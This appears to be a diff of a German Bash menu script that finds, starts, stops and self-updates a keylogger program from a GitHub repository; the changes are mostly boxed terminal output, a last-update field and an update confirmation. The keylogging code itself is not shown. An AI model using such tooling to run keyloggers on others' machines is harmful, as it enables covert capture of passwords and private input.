@@ -23,11 +23,11 @@ find_py() {
         "$HOME/Downloads/keylogger.py" \
         "$HOME/Scripts/keylogger.py" \
         "$HOME/Desktop/keylogger.py" \
-		"$HOME/Downloads/Keylogger/keylogger.py" \
-		"$HOME/Documents/Keylogger/keylogger.py" \
-		"$HOME/Desktop/Keylogger/keylogger.py" \
+        "$HOME/Downloads/Keylogger/keylogger.py" \
+        "$HOME/Documents/Keylogger/keylogger.py" \
+        "$HOME/Desktop/Keylogger/keylogger.py" \
         "$HOME/Documents/keylogger.py" \
-		"$HOME/Keylogger/keylogger.py" 
+        "$HOME/Keylogger/keylogger.py"
     do
         [ -f "$cand" ] && { echo "$cand"; return 0; }
     done
@@ -36,60 +36,137 @@ find_py() {
 
 PY=$(find_py)
 
-# ---------- Update-Check ----------
-# Liest die lokale info.txt (Format: version=1.0.0)
+# Wenn keylogger.py gefunden wurde, PROJECT_DIR auf dessen Ordner setzen
+if [ -n "$PY" ]; then
+    PROJECT_DIR="$(dirname "$PY")"
+fi
+
+# ---------- Version / LastUpdate ----------
 get_local_version() {
     local info="$PROJECT_DIR/$INFO_FILE"
     if [ -f "$info" ]; then
         grep -E '^version=' "$info" | cut -d'=' -f2 | tr -d '[:space:]'
-    else
-        echo ""
     fi
 }
 
-# Holt die neueste Version aus dem GitHub-Repo (via raw info.txt auf main)
+get_local_lastupdate() {
+    local info="$PROJECT_DIR/$INFO_FILE"
+    if [ -f "$info" ]; then
+        grep -E '^lastUpdate=' "$info" | cut -d'=' -f2- | tr -d '[:space:]'
+    fi
+}
+
 get_remote_version() {
     local raw_url="https://raw.githubusercontent.com/${GITHUB_REPO}/${GITHUB_BRANCH}/${INFO_FILE}"
     curl -fsSL "$raw_url" 2>/dev/null | grep -E '^version=' | cut -d'=' -f2 | tr -d '[:space:]'
 }
 
-# Zeigt Update-Status und führt bei Bedarf das Update aus
-check_update() {
-    echo "═══════════════════════════════════════"
-    echo " UPDATE-CHECK"
-    echo "═══════════════════════════════════════"
+get_remote_lastupdate() {
+    local raw_url="https://raw.githubusercontent.com/${GITHUB_REPO}/${GITHUB_BRANCH}/${INFO_FILE}"
+    curl -fsSL "$raw_url" 2>/dev/null | grep -E '^lastUpdate=' | cut -d'=' -f2- | tr -d '[:space:]'
+}
 
-    local local_ver
+# ---------- ASCII-Hilfen ----------
+# Rahmenbreite (innen)
+BOX_W=58
+
+# Zeile im Rahmen (links/rechts mit ║)
+box_line() {
+    local text="$1"
+    # ANSI-Farben für die Breitenberechnung entfernen
+    local clean
+    clean=$(printf "%s" "$text" | sed -E 's/\x1B\[[0-9;]*[mK]//g')
+    local len=${#clean}
+    local pad=$((BOX_W - len))
+    [ "$pad" -lt 0 ] && pad=0
+    printf "║ %s%*s ║\n" "$text" "$pad" ""
+}
+
+# Trennlinie mit optionalem Label
+box_sep() {
+    local label="$1"
+    if [ -z "$label" ]; then
+        printf "╠"; printf "═%.0s" $(seq 1 $((BOX_W + 2))); printf "╣\n"
+    else
+        local clean
+        clean=$(printf "%s" "$label" | sed -E 's/\x1B\[[0-9;]*[mK]//g')
+        local len=${#clean}
+        local left=2
+        local right=$((BOX_W + 2 - left - len - 1))
+        [ "$right" -lt 0 ] && right=0
+        printf "╠"; printf "═%.0s" $(seq 1 $left)
+        printf " %s " "$label"
+        printf "═%.0s" $(seq 1 $right); printf "╣\n"
+    fi
+}
+
+box_top()    { printf "╔"; printf "═%.0s" $(seq 1 $((BOX_W + 2))); printf "╗\n"; }
+box_bottom() { printf "╚"; printf "═%.0s" $(seq 1 $((BOX_W + 2))); printf "╝\n"; }
+
+# ---------- Update-Check mit ASCII-Fenster ----------
+check_update() {
+    clear
+    echo
+    box_top
+    box_line "UPDATE-CHECK"
+    box_line "Repository: ${GITHUB_REPO} (${GITHUB_BRANCH})"
+    box_sep ""
+
+    local local_ver local_upd remote_ver remote_upd
     local_ver="$(get_local_version)"
+    local_upd="$(get_local_lastupdate)"
 
     if [ -z "$local_ver" ]; then
-        echo "[!] Keine lokale info.txt gefunden in: $PROJECT_DIR"
-        echo "    Erwartet: $INFO_FILE mit Inhalt 'version=x.y.z'"
+        box_line "✗ Keine lokale info.txt gefunden"
+        box_line "  Pfad: $PROJECT_DIR/$INFO_FILE"
+        box_bottom
+        echo
         return 1
     fi
 
-    echo "[i] Lokale Version:  $local_ver"
-    echo "[i] Prüfe Remote …"
+    box_line "Lokal:"
+    box_line "  Version:     $local_ver"
+    box_line "  Last Update: ${local_upd:-unbekannt}"
+    box_sep ""
 
-    local remote_ver
+    box_line "Prüfe Remote …"
     remote_ver="$(get_remote_version)"
+    remote_upd="$(get_remote_lastupdate)"
 
     if [ -z "$remote_ver" ]; then
-        echo "[!] Remote-Version konnte nicht gelesen werden."
-        echo "    Prüfe Internetverbindung und ob info.txt im Repo existiert."
+        box_line "✗ Remote-Version nicht lesbar"
+        box_line "  Prüfe Internet & info.txt im Repo"
+        box_bottom
+        echo
         return 1
     fi
 
-    echo "[i] Remote Version:  $remote_ver"
+    box_line "Remote:"
+    box_line "  Version:     $remote_ver"
+    box_line "  Last Update: ${remote_upd:-unbekannt}"
+    box_sep ""
 
     if [ "$local_ver" = "$remote_ver" ]; then
+        box_line "✓ Du bist auf dem neuesten Stand."
+        box_line "  Version: $local_ver"
+        [ -n "$local_upd" ] && box_line "  Stand:   $local_upd"
+        box_bottom
         echo
-        echo "[✓] Du bist auf dem neuesten Stand (Version $local_ver)."
         return 0
     fi
 
+    box_line "↑ Update verfügbar!"
+    box_line "  $local_ver  →  $remote_ver"
+    [ -n "$remote_upd" ] && box_line "  Neuer Stand: $remote_upd"
+    box_bottom
     echo
-    echo "[!] Update verfügbar: $local_ver → $remote_ver"
+
+    # Sicherheitsabfrage
+    read -rp "  Update jetzt installieren? [j/N] " confirm
+    case "$confirm" in
+        j|J|y|Y) ;;
+        *) echo "  Abgebrochen."; return 0 ;;
+    esac
     echo
 
     # Download in Temp-Ordner
@@ -97,24 +174,29 @@ check_update() {
     tmp_dir="$(mktemp -d /tmp/keylogger-update.XXXXXX)" || { echo "[!] Temp-Ordner fehlgeschlagen."; return 1; }
 
     local zip_path="$tmp_dir/keylogger.zip"
-    echo "[i] Lade ZIP herunter …"
 
-    # Größe vorab ermitteln (Content-Length)
+    box_top
+    box_line "DOWNLOAD"
+    box_sep ""
+
+    # Größe vorab ermitteln
     local size_bytes
     size_bytes=$(curl -sIL "$ZIP_URL" 2>/dev/null | grep -i '^content-length:' | tail -1 | tr -dc '0-9')
     if [ -n "$size_bytes" ] && [ "$size_bytes" -gt 0 ] 2>/dev/null; then
         local size_human
         size_human=$(echo "$size_bytes" | awk '{printf "%.1f MB", $1/1024/1024}')
-        echo "[i] Dateigröße: $size_human"
+        box_line "Dateigröße: $size_human"
     fi
+
+    box_bottom
+    echo
 
     if ! curl -fL --progress-bar -o "$zip_path" "$ZIP_URL"; then
         echo "[!] Download fehlgeschlagen."
         rm -rf "$tmp_dir"
         return 1
     fi
-
-    echo "[✓] Download abgeschlossen."
+    echo
 
     # Entpacken
     echo "[i] Entpacke …"
@@ -124,7 +206,6 @@ check_update() {
         return 1
     fi
 
-    # Entpackter Ordner heißt normalerweise Keylogger-main
     local extracted
     extracted=$(find "$tmp_dir" -maxdepth 1 -type d -name "Keylogger-*" | head -1)
     if [ -z "$extracted" ]; then
@@ -133,18 +214,16 @@ check_update() {
         return 1
     fi
 
-    # Alten Ordner sichern (falls etwas schiefgeht)
+    # Alten Ordner sichern
     local backup_dir="${PROJECT_DIR}.bak.$(date +%Y%m%d%H%M%S)"
     echo "[i] Ersetze Projektordner …"
 
-    # Aktuellen Ordner verschieben (nicht löschen, für den Fall der Fälle)
     if ! mv "$PROJECT_DIR" "$backup_dir"; then
         echo "[!] Konnte alten Ordner nicht verschieben."
         rm -rf "$tmp_dir"
         return 1
     fi
 
-    # Neuen Ordner an die Stelle des alten verschieben
     if ! mv "$extracted" "$PROJECT_DIR"; then
         echo "[!] Konnte neuen Ordner nicht einsetzen. Stelle Backup wieder her …"
         mv "$backup_dir" "$PROJECT_DIR"
@@ -152,13 +231,22 @@ check_update() {
         return 1
     fi
 
-    # Aufräumen
     rm -rf "$tmp_dir"
-    echo "[✓] Update abgeschlossen: $local_ver → $remote_ver"
-    echo "    Backup des alten Ordners: $backup_dir"
-    echo "    (Kann gelöscht werden, wenn alles läuft.)"
+
+    # Abschluss-Fenster
     echo
-    echo "[i] Bitte starte das Bash-Skript neu, damit die neue Version aktiv wird."
+    box_top
+    box_line "UPDATE ERFOLGREICH"
+    box_sep ""
+    box_line "  $local_ver  →  $remote_ver"
+    [ -n "$remote_upd" ] && box_line "  Stand: $remote_upd"
+    box_sep ""
+    box_line "Backup: ${backup_dir}"
+    box_line "  (kann gelöscht werden)"
+    box_sep ""
+    box_line "↻ Bitte Skript neu starten"
+    box_bottom
+    echo
     return 0
 }
 
@@ -298,10 +386,12 @@ show_status() {
     echo "═══════════════════════════════════════"
     echo " STATUS"
     echo "═══════════════════════════════════════"
-    echo " Dienst:  $(status_line)"
-    echo " Skript:  ${PY:-<nicht gefunden>}"
-    echo " Logs:    $LOG_DIR"
-    echo " Version: $(get_local_version || echo 'unbekannt')"
+    echo " Dienst:      $(status_line)"
+    echo " Skript:      ${PY:-<nicht gefunden>}"
+    echo " Projekt:     $PROJECT_DIR"
+    echo " Logs:        $LOG_DIR"
+    echo " Version:     $(get_local_version || echo 'unbekannt')"
+    echo " Last Update: $(get_local_lastupdate || echo 'unbekannt')"
     if [ -s "$ERRLOG" ]; then
         echo " Letzte Fehler:"
         tail -n 3 "$ERRLOG" | sed 's/^/   /'
@@ -376,9 +466,10 @@ while true; do
     echo "═══════════════════════════════════════"
     echo "   KEYLOGGER STEUERUNG"
     echo "═══════════════════════════════════════"
-    echo " Status: $(status_line)"
-    echo " Version: $(get_local_version || echo 'unbekannt')"
-    echo " Skript: ${PY:-<nicht gefunden>}"
+    echo " Status:      $(status_line)"
+    echo " Version:     $(get_local_version || echo 'unbekannt')"
+    echo " Last Update: $(get_local_lastupdate || echo 'unbekannt')"
+    echo " Skript:      ${PY:-<nicht gefunden>}"
     echo "───────────────────────────────────────"
     echo "  1) Starten"
     echo "  2) Stoppen"
